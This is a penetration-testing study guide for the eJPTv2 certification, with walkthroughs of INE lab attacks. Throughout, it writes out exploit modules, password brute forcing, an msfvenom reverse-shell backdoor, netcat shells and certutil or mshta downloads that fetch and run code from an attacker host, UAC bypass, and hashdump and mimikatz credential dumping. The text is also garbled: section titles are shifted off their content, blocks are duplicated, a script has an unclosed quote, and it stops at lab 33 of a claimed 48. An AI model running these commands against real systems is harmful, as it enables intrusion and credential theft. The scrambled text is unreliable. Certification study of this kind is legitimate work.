# eJPTv2 — Complete Lab Walkthroughs & Master Reference

**Author:** Dr. Mohammed Tawfik · kmkhol01@gmail.com · ORCID 0000-0002-1227-387X
**Affiliation:** Sana'a University (Yemen) · Ajloun National University (Jordan)
**Purpose:** Complete CTF / hands-on lab reference for students preparing for the eJPT v2 certification.

> ⚠️ **Authorized lab use only.** Every command targets the isolated INE/eJPT lab machines
> (e.g. `demo.ine.local`, `victim-1`). The IPs/hostnames shown are examples copied from the
> source labs — substitute the values from *your* live lab session. Do not run these against
> any system you don't own or lack written permission to test.

---

## How this document is organized

- **Part 0 — Quick Start / Exam Day** — Signatures, methodology, wordlists, tips
- **Labs 1–48** — Every INE eJPTv2 lab as a self-contained command block (run top to bottom)
- **Appendix A — Technique Cross-Reference** — Same content reorganized by attack technique
- **Appendix B — Tool Reference** — What each tool does and which labs use it

---

# PART 0 — QUICK START / EXAM DAY

## Lab signatures (recognize → respond)

| Port / Banner | Lab Type | First Move | See Lab # |
|---|---|---|---|
| ICMP blocked, nmap "down" | Firewalled host | `nmap -Pn` | 1 |
| 21 → vsftpd / ProFTPD | FTP | anon login → brute → searchsploit | 23, 26, 42 |
| 22 → OpenSSH | SSH | `ssh_login` brute / `libssh_auth_bypass` | 4, 17, 38, 39 |
| 25 → Postfix/SMTP | Mail recon | VRFY, `smtp_enum` | 16, 17 |
| 80 → HttpFileServer 2.3 | Rejetto HFS | `rejetto_hfs_exec` | 9, 10, 25, 36, 42 |
| 80 → BadBlue 2.7 | BadBlue | `badblue_passthru` | 11, 37, 40, 42 |
| 80 → IIS + DAV: in OPTIONS | WebDAV | `davtest` → upload ASP shell | 6 |
| 80 → Apache + CGI | Possibly Shellshock | `apache_mod_cgi_bash_env_exec` | 5, 29 |
| 80 → Apache plain | Apache enum | `http_*` MSF modules | 15, 16, 44, 46, 47 |
| 80 → WordPress | WPScan | `wpscan` | 48 |
| 80 → XODA app | XODA | `xoda_file_upload` | 2, 3, 14 |
| 139/445 → Samba 3.0.20 | Old Samba | `usermap_script` | 24 |
| 139/445 → Samba 3.5–4.6 | SambaCry | `is_known_pipename` | 31, 32, 33 |
| 139/445 → Samba 4.x modern | SMB recon | `enum4linux`, `smb_login` | 24 |
| 161/udp → SNMP | SNMP | `snmpwalk -c public` | 12 |
| 445 → Windows SMB | psexec | `smb_login` → `psexec` | 11 |
| 3306 → MySQL | MySQL enum | `mysql_login` → `mysql_*` | 4 |
| 3333 / odd port → RDP | Insecure RDP | `rdp_scanner` → Hydra → `xfreerdp` | 7 |
| 5985 → wsman | WinRM | `winrm_login` → `winrm_script_exec` | 8, 9 |
| 8000 → web terminal | Linux privesc lab | Direct shell, hunt shadow/sudo | 34, 35 |
| Multi-NIC compromised host | Pivoting | `autoroute` + portscan/proxychains | 2, 3, 11, 14, 42 |

## Universal methodology

```
1.  Host discovery     nmap -sn <CIDR>           (or -Pn if ICMP blocked)
2.  Port scan          nmap -sS -p- --min-rate 1000 <target>
3.  Service versions   nmap -sV -sC -p<ports> <target>
4.  UDP top ports      nmap -sU --top-ports 100 <target>
5.  Per-service enum   (see Lab matching the service)
6.  Find exploits      searchsploit <service> <version>
7.  Exploit            MSF module or manual
8.  Local enum         whoami, sysinfo, ipconfig/ip a
9.  Privesc            getsystem / incognito / UACMe / shadow / sudo escapes
10. Loot + pivot       hashdump, autoroute, find flags
```

## Wordlist & resource locations

```bash
# Metasploit built-in
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
/usr/share/metasploit-framework/data/wordlists/common_passwords.txt
/usr/share/metasploit-framework/data/wordlists/directory.txt

# rockyou — extract first!
gunzip /usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/rockyou.txt

# Lab-provided (varies — always ls first)
/root/Desktop/wordlists/

# Webshells
/usr/share/webshells/asp/
/usr/share/webshells/aspx/
/usr/share/webshells/php/

# Windows binaries
/usr/share/windows-binaries/
/usr/share/windows-resources/binaries/
/usr/share/windows-resources/mimikatz/x64/

# Static binaries for pivot targets
/root/static-binaries/
```

## Exam-day tips

- Practice **pivoting** hands-on — highest leverage. Use `autoroute` over SOCKS for stability.
- Try **default credentials** first (root/blank, admin/admin) before brute forcing.
- Don't panic on Q1. Start with `ip -br a`, `route`, understand the network.
- **Hydra can't do SMBv2+** — use MSF `smb_login` instead.
- **Old webshells break on modern IIS** — keep a 10-line custom ASP shell ready.
- Can't reach a site? Add it to `/etc/hosts`.
- Cap rabbit-holes at **30 minutes**. Move on, come back.
- 48 hours is plenty if methodical. **Sleep at some point.**
- Read the question literally. Flag may be a fact (port#, username), not a file.
- Check non-default ports — always `-p-`.

## Flag formats seen

- MD5 hash (32 hex) — most common: `0cc175b9c0f1b6a831c399e269772661`
- Wrapped: `FLAG1{md5hash}` — submit only the hash
- Plain fact — port number, username, password
- File contents — `type flag.txt` / `cat /flag`

---

# LAB WALKTHROUGHS

The 48 numbered labs below are self-contained command sequences from real INE eJPTv2 lab playthroughs. Run them top-to-bottom against the matching lab. Substitute IPs from your live session.

## 1. Host Discovery & Firewall Evasion (Nmap -Pn)

```bash
ping -c 5 demo.ine.local

nmap demo.ine.local

nmap -Pn demo.ine.local

nmap -Pn -p 443 demo.ine.local

nmap -Pn -sV -p 80 demo.ine.local
```

## 2. Pivoting via XODA File Upload (Metasploit autoroute + portscan)

```bash
ping -c 4 demo1.ine.local

nmap demo1.ine.local

curl demo1.ine.local

msfconsole

use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit

shell
ip addr

run autoroute -s 192.180.108.2

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit

ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap

#!/bin/bash
for port in {1..1000}; do
timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port
done

sessions -i 1

upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh

shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3

./nmap -p- 192.180.108.3
```

## 3. Pivoting via XODA File Upload (second walkthrough)

```bash
ping -c 4 demo1.ine.local

nmap demo1.ine.local

curl demo1.ine.local

msfconsole

use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit

shell
ip addr

run autoroute -s 192.180.108.2

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit

ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap

#!/bin/bash
for port in {1..1000}; do
timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port
done

sessions -i 1

upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh

shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3

./nmap -p- 192.180.108.3

nmap demo.ine.local

nmap -sU --top-ports 25 demo.ine.local

nmap -sV -p 445 demo.ine.local

nmap --script smb-os-discovery.nse -p 445 demo.ine.local

msfconsole -q
use auxiliary/scanner/smb/smb_version
set RHOSTS demo.ine.local
exploit

nmap --script smb-os-discovery.nse -p 445 demo.ine.local

nmblookup -A demo.ine.local

smbclient -L demo.ine.local -N

rpcclient -U "" -N demo.ine.local

ping -c 5 victim-1

msfconsole -q

use auxiliary/scanner/http/http_version
set RHOSTS victim-1
run
Module 2: auxiliary/scanner/http/robots_txt

use auxiliary/scanner/http/robots_txt
set RHOSTS victim-1
run
Module 3: auxiliary/scanner/http/http_header

use auxiliary/scanner/http/http_header
set RHOSTS victim-1
run

use auxiliary/scanner/http/http_header
set RHOSTS victim-1
set TARGETURI /secure
run
Module 4: auxiliary/scanner/http/brute_dirs

use auxiliary/scanner/http/brute_dirs
set RHOSTS victim-1
run
Module 5: auxiliary/scanner/http/dir_scanner

use auxiliary/scanner/http/dir_scanner
set RHOSTS victim-1
set DICTIONARY
/usr/share/metasploit-framework/data/wordlists/directory.txt
run
Module 6: auxiliary/scanner/http/dir_listing

use auxiliary/scanner/http/dir_listing
set RHOSTS victim-1
set PATH /data
run
Module 7: auxiliary/scanner/http/files_dir

use auxiliary/scanner/http/files_dir
set RHOSTS victim-1
set VERBOSE false
run
Module 8: auxiliary/scanner/http/http_put

use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run

wget http://victim-1:80/data/test.txt
cat test.txt
"Welcome To AttackDefense"

use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run

wget http://victim-1:80/data/test.txt
Module 9: auxiliary/scanner/http/http_login

use auxiliary/scanner/http/http_login
set RHOSTS victim-1
set AUTH_URI /secure/
set VERBOSE false
run
Module 10: auxiliary/scanner/http/apache_userdir_enum

use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE
/usr/share/metasploit-framework/data/wordlists/common_users.txt
set RHOSTS victim-1
set VERBOSE false
run

ping -c 4 demo.ine.local

nmap demo.ine.local

msfconsole -q
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run

use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run

use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run

use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST
/usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run

use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run

use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run

use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST
/usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

## 4. MySQL & SSH Login Enumeration (Metasploit auxiliary)

```bash
ping -c 4 demo.ine.local

nmap -sS -sV demo.ine.local

msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit

use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE
/usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE
/usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit

sessions
sessions -i 1
find / -name "flag"
cat /flag

nmap -sV -script banner demo.ine.local

nc demo.ine.local 25

telnet demo.ine.local 25

smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t
demo.ine.local

msfconsole -q
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS demo.ine.local
exploit

telnet demo.ine.local 25

demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```

## 5. Shellshock Exploitation

```bash
nmap demo.ine.local

nmap --script http-shellshock --script-args
"http-shellshock.uri=/gettime.cgi" demo.ine.local
```

## 6. Windows IIS WebDAV (DAVTest, Cadaver, Metasploit)

```bash
nmap demo.ine.local

nmap --script http-enum -sV -p 80 demo.ine.local

davtest -url http://demo.ine.local/webdav
We can notice, /webdav path is secured with basic authentication. We
have the credentials access the /webdav path using the provided

davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
to the /webdav directory. Also, we can execute three types of files. i.e

msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
exploit

shell
cd /
type flag.txt
```

## 7. Windows Insecure RDP Service

```bash
ping -c 4 demo.ine.local

nmap -sV demo.ine.local

msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS demo.ine.local
set RPORT 3333
exploit

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt
-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
rdp://demo.ine.local -s 3333

xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333
Got to “My Computer” → C:\
```

## 8. RDP on Non-Default Port (Nmap + brute force)

```bash
nmap --top-ports 7000 demo.ine.local

msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE
/usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit

use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit

use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit

use exploit/windows/winrm/winrm_script_exec
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit

cd /
cat flag.txt

ping -c 4 demo.ine.local

nmap demo.ine.local

nmap -sV -p 80 demo.ine.local

msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit

getuid
sysinfo

ps -S explorer.exe
migrate 2332

getsystem

shell
net localgroup administrators

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444
-f exe > 'backdoor.exe'
file backdoor.exe

cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls

msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.31.2
set LPORT 4444
exploit

shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
-   Author: Leo Davidson derivative
-   Type: Dll Hijack
-   Method: IFileOperation
-   Target(s): \system32\pkgmgr.exe
-   Component(s): DismCore.dll
-   Implementation: ucmDismMethod

ps -S lsass.exe
migrate 496

hashdump
```

## 9. Rejetto HFS 2.3 RCE / WinRM Exploitation

```bash
nmap --top-ports 7000 demo.ine.local

msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE
/usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit

use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit

use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit

use exploit/windows/winrm/winrm_script_exec
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit

cd /
cat flag.txt
```

## 10. Privilege Escalation: Impersonate / Incognito

```bash
nmap demo.ine.local

nmap -sV -p 80 demo.ine.local

msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
getuid

cat C:\\Users\\Administrator\\Desktop\\flag.txt

load incognito

impersonate_token ATTACKDEFENSE\\Administrator
getuid
cat C:\\Users\\Administrator\\Desktop\\flag.txt

cd .\Desktop\PowerSploit\Privesc\
ls

. .\PowerUp.ps1

cat C:\Windows\Panther\Unattend.xml

$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
echo $password

runas.exe /user:administrator cmd
whoami

msfconsole -q
use exploit/windows/misc/hta_server
exploit
i.e “http://10.10.31.2:8080/Bn75U0NL8ONS.hta” and run it on cmd.exe with

mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta

sessions -i 1
cd /
cd C:\\Users\\Administrator\\Desktop
cat flag.txt
```

## 11. HTA Web Server + Meterpreter Kiwi (Mimikatz)

```bash
ping -c 4 demo.ine.local

nmap demo.ine.local

nmap -sV -p 80 demo.ine.local

msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit

migrate -N lsass.exe

load kiwi

lsa_dump_sam

lsa_dump_secrets

ping -c 5 demo.ine.local
ping -c 5 demo1.ine.local

nmap demo.ine.local

nmap -sV -p 139,445 demo.ine.local
-sV: Probe open ports to determine service/version info
-p 139,445: Only scan specified ports

nmap -p445 --script smb-protocols demo.ine.local
-p445: Only scan specified port.
--script smb-protocols: Script Scan

nmap -p445 --script smb-security-mode demo.ine.local
[https://nmap.org/nsedoc/scripts/smb-security-mode.html]

smbclient -L demo.ine.local
Password for [WORKGROUP\root]: <enter>

nmap -p445 --script smb-enum-users.nse demo.ine.local

hydra -L users.txt -P
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
demo.ine.local smb
-L: List of users
-P: Password list
demo.ine.local smb: Target Address and Target Protocol

msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
exploit

getuid
sysinfo

cat C:\\Users\\Administrator\\Documents\\FLAG1.txt

shell
ping 10.0.28.125

run autoroute -s 10.0.28.125/20

cat /etc/proxychains4.conf

background
use auxiliary/server/socks_proxy
show options

set SRVPORT 9050
set VERSION 4a
exploit

proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
demo1.ine.local: The pivot machine
-sT: TCP connect scan

sessions -i 1
shell
net view 10.0.28.125

migrate -N explorer.exe
shell
net view 10.0.28.125

net use D: \\10.0.28.125\Documents
net use K: \\10.0.28.125\K$

cat D:\\Confidential.txt
cat D:\\FLAG2.txt
SNMP Analysis
```

## 12. SNMP Analysis

```bash
ping -c 5 demo.ine.local

nmap demo.ine.local

nmap -sU -p 161 demo.ine.local

nmap -sU -p 161 --script=snmp-brute demo.ine.local

snmpwalk -v 1 -c public demo.ine.local
-v: Specifies SNMP version to use
-c: Set the community string
nmap SNMP scripts, for specific information.

nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
ls

hydra -L users.txt -P
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
demo.ine.local smb
-   -L users.txt: This is the dictionary file containing a list of
-   -P
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt:
"Metasploit Framework"
-   demo.ine.local: The target
-   smb: This is the protocol that should be used by hydra to perform

msfconsole -q
use exploit/windows/smb/psexec
show options

set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit

shell
cd C:\
type FLAG1.txt
information via the SNMP service.
```

## 13. DNS & SMB Relay Attack

_GUI / tool-interface lab (Burp Suite, phishing console, etc.) — refer to the original document's screenshots; no standalone shell commands were captured._

## 14. T1046 Network Service Scanning

```bash
ping -c 4 demo1.ine.local

nmap demo1.ine.local

curl demo1.ine.local

msfconsole

use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit

shell
ip addr

run autoroute -s 192.180.108.2

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit

ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap

#!/bin/bash
for port in {1..1000}; do
timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port
done

sessions -i 1

upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh

shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3

./nmap -p- 192.180.108.3
```

## 15. Apache Enumeration

```bash
ping -c 5 victim-1

msfconsole -q

use auxiliary/scanner/http/http_version
set RHOSTS victim-1
run
Module 2: auxiliary/scanner/http/robots_txt

use auxiliary/scanner/http/robots_txt
set RHOSTS victim-1
run
Module 3: auxiliary/scanner/http/http_header

use auxiliary/scanner/http/http_header
set RHOSTS victim-1
run

use auxiliary/scanner/http/http_header
set RHOSTS victim-1
set TARGETURI /secure
run
Module 4: auxiliary/scanner/http/brute_dirs

use auxiliary/scanner/http/brute_dirs
set RHOSTS victim-1
run
Module 5: auxiliary/scanner/http/dir_scanner

use auxiliary/scanner/http/dir_scanner
set RHOSTS victim-1
set DICTIONARY
/usr/share/metasploit-framework/data/wordlists/directory.txt
run
Module 6: auxiliary/scanner/http/dir_listing

use auxiliary/scanner/http/dir_listing
set RHOSTS victim-1
set PATH /data
run
Module 7: auxiliary/scanner/http/files_dir

use auxiliary/scanner/http/files_dir
set RHOSTS victim-1
set VERBOSE false
run
Module 8: auxiliary/scanner/http/http_put

use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run

wget http://victim-1:80/data/test.txt
cat test.txt
"Welcome To AttackDefense"

use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run

wget http://victim-1:80/data/test.txt
Module 9: auxiliary/scanner/http/http_login

use auxiliary/scanner/http/http_login
set RHOSTS victim-1
set AUTH_URI /secure/
set VERBOSE false
run
Module 10: auxiliary/scanner/http/apache_userdir_enum

use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE
/usr/share/metasploit-framework/data/wordlists/common_users.txt
set RHOSTS victim-1
set VERBOSE false
run
```

## 16. http_login / apache_userdir_enum

```bash
nmap -sV -script banner demo.ine.local

nc demo.ine.local 25

telnet demo.ine.local 25

smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t
demo.ine.local

msfconsole -q
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS demo.ine.local
exploit

telnet demo.ine.local 25

demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```

## 17. Postfix / SMTP Recon

```bash
ping -c 4 demo.ine.local

nmap -sS -sV demo.ine.local

msfconsole -q
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS demo.ine.local
set SPAWN_PTY true
exploit
sessions -i 1
```

## 18. Vulnerable SSH Server

```bash
ifconfig

nmap -sV -O 192.8.94.3

nmap -sV --script=banner 192.8.94.3

nc 192.8.94.3 22
service running on that port.
```

## 19. Banner Grabbing

```bash
ifconfig

nmap -sV -O 192.152.25.3

nmap -sV -p 80 --script=http-shellshock --script-args
"http-shellshock.uri=/gettime.cgi" 192.152.25.3

ls -al /usr/share/nmap/scripts | grep vuln
```

## 20. Vulnerability Scanning with Nmap Scripts

_GUI / tool-interface lab (Burp Suite, phishing console, etc.) — refer to the original document's screenshots; no standalone shell commands were captured._

## 21. Fixing Exploits / Bind Shells

```bash
cd /usr/share/windows-binaries
running the following command:

python -m SimpleHTTPServer 80

ifconfig

nc.exe -nvlp 1234 -e cmd.exe

nc -nv 10.0.23.27 1234

nc -nvlp 1234 -e /bin/bash

nc.exe -nv 10.10.31.2 1234
```

## 22. Netcat Fundamentals (Bind Shell)

```bash
ping -c 4 demo.ine.local

nc -help

nc 10.0.27.35 80

nc -nv 10.0.27.35 80
'80 (http) open': This indicates that port 80 on target IP is open. The

nc -nv 10.0.27.35 21

nc -nvu 10.0.27.35 161

cd /usr/share/windows-binaries
running the following command:

python -m SimpleHTTPServer 80

ifconfig

certutil -urlcache -f http://10.10.31.2/nc.exe nc.exe
the nc.exe executable.

nc -nvlp 1234

nc -nv 10.10.31.2 1234

echo "Hello, this was sent over with Netcat" >> test.txt

nc.exe -nvlp 1234 > test.txt

nc -nv 10.0.27.35 1234 < test.txt
```

## 23. Reverse Shells

```bash
cd /usr/share/windows-binaries
ls

python -m SimpleHTTPServer 80

ifconfig

certutil -urlcache -f http://<Kali_Machine_IP_address>/nc.exe nc.exe

nc -nvlp 1234

./nc.exe -nv <Kali_Machine_IP_address> 1234 -e cmd.exe

whoami

ping -c 4 demo.ine.local

nmap -sV -sC -p 21 demo.ine.local

ftp demo.ine.local 21

msfconsole

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOSTS demo.ine.local

run
find another way in.

hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt
-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
demo.ine.local ftp

ftp demo.ine.local 21
```

## 24. Targeting SAMBA

```bash
ping -c 4 demo.ine.local

nmap -sV -p 445 demo.ine.local

msfconsole

use auxiliary/scanner/smb/smb_version

set RHOSTS demo.ine.local

run

use exploit/multi/samba/usermap_script
set RHOSTS demo.ine.local
exploit
```

## 25. Post-Exploitation: Enumerating System Info (Windows)

```bash
ping -c 4 demo.ine.local

nmap -sV demo.ine.local

msfconsole

use exploit/windows/http/rejetto_hfs_exec

set RHOSTS demo.ine.local

exploit

sysinfo

shell

ping -c 4 demo.ine.local

nmap -sV demo.ine.local

msfconsole

use exploit/windows/http/rejetto_hfs_exec

set RHOSTS demo.ine.local

exploit

getuid

getprivs

background

use post/windows/gather/enum_logged_on_users

set SESSION 1

run

sessions 1

shell

whoami

whoami /priv

net users

net user administrator

net localgroup

net localgroup administrators

ping -c 4 demo.ine.local

nmap -sV demo.ine.local

msfconsole

use exploit/windows/http/rejetto_hfs_exec

set RHOSTS demo.ine.local

exploit

ipconfig
running the following command:

ipconfig /all
As shown in the preceding screenshot, the ipconfig /all command reveals

route print

arp -a

ping -c 4 demo.ine.local

nmap -sV demo.ine.local

msfconsole

use exploit/windows/http/rejetto_hfs_exec

set RHOSTS demo.ine.local

exploit

ps

pgrep explorer.exe
of the explorer.exe process.

migrate 2252

net start

tasklist /SVC

schtasks /query /fo LIST

ping -c 4 demo.ine.local

nmap -sV -p 5985 demo.ine.local

msfconsole

use exploit/windows/winrm/winrm_script_exec

set RHOSTS demo.ine.local
set USERNAME administrator

set PASSWORD tinkerbell

set FORCE_VBS false

run

background

use post/windows/gather/win_privs

set SESSION 1

run

use post/windows/gather/enum_logged_on_users

set SESSION 1

run
running the following command:

use post/windows/gather/checkvm

set SESSION 1

run
enumerates a list of installed application/programs on the target

use post/windows/gather/enum_applications

set SESSION 1

run

use post/windows/gather/enum_computers

set SESSION 1

run

use post/windows/gather/enum_patches

set SESSION 1

run

cd C:\\

cd temp

upload /root/Desktop/jaws-enum.ps1

shell

powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
-OutputFilename JAWS-Enum.txt

download JAWS-Enum.txt
to /root/ and opening the JAWS-Enum.txt file with the mousepad as shown
```

## 26. Enumerating System Information (Linux) + JAWS

```bash
nmap -sV demo.ine.local

msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS demo.ine.local
exploit

sessions -u 1
sessions
sessions -i 2

sysinfo

shell
/bin/bash -i

cat /etc/issue
cat /etc/*release

target system by running the following command:

lscpu

nmap -sV demo.ine.local

msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS demo.ine.local
exploit

sessions -u 1
sessions
sessions -i 2

getuid
target system as the root user.

shell
/bin/bash -i
whoami
running the following command:

cat /etc/passwd
```

## 27. Enumerating Users & Groups (Linux)

```bash
nmap -sV demo.ine.local

msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS demo.ine.local
exploit

sessions -u 1
sessions
sessions -i 2

ifconfig

route

background
sessions -i 1
/bin/bash -i

cat /etc/networks

cat /etc/hosts

cat /etc/resolv.conf
```

## 28. Enumerating Network Information (Linux)

```bash
nmap -sV demo.ine.local

msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS demo.ine.local
exploit

sessions -u 1
sessions -i 2

ps

running the following command:

ls -al /etc/cron*
```

## 29. Enumerating Processes and Cron Jobs (Linux)

```bash
ping -c4 demo.ine.local

nmap -sV demo.ine.local
use of a Metasploit exploit module.

msfconsole

use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS demo.ine.local

set TARGETURI /gettime.cgi

set LHOST 192.58.2.2

exploit

background

use post/linux/gather/enum_configs

set SESSION 1

run

use post/linux/gather/enum_network

set SESSION 1

run

use post/linux/gather/enum_system

set SESSION 1

run

cd /tmp

upload /root/Desktop/LinEnum.sh
running the following command:

shell

/bin/bash -i

chmod +x LinEnum.sh

./LinEnum.sh

python -m SimpleHTTPServer 80
screenshot.
```

## 30. Automating Linux Local Enumeration

```bash
ping -c 4 demo.ine.local

nmap -sV demo.ine.local

msfconsole

use exploit/windows/http/rejetto_hfs_exec

set RHOSTS demo.ine.local

exploit

cd /usr/share/windows-resources/mimikatz/x64

python3 -m http.server 80

cd C:\\

cd Temp

shell

certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
downloaded successfully onto the Windows system.
```

## 31. Transferring Files To Windows Targets (certutil)

```bash
ping -c 4 demo.ine.local

nmap -sV demo.ine.local
use of a Metasploit module.

msfconsole

use exploit/linux/samba/is_known_pipename

set RHOSTS demo.ine.local

exploit

cd /usr/share/webshells/php/

python3 -m http.server 80

wget http://192.217.117.2/php-backdoor.php
```

## 32. Transferring Files To Linux Targets (wget)

```bash
ping -c 4 demo.ine.local

nmap -sV demo.ine.local
use of a Metasploit module.

msfconsole

use exploit/linux/samba/is_known_pipename

set RHOSTS demo.ine.local

exploit

/bin/bash -i

python -c 'import pty; pty.spawn("/bin/bash")'
```

## 33. Upgrading Non-Interactive Shells

```bash
cd C:\Users\student\Desktop\PrivescCheck
ls

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

runas.exe /user:administrator cmd
whoami

msfconsole -q
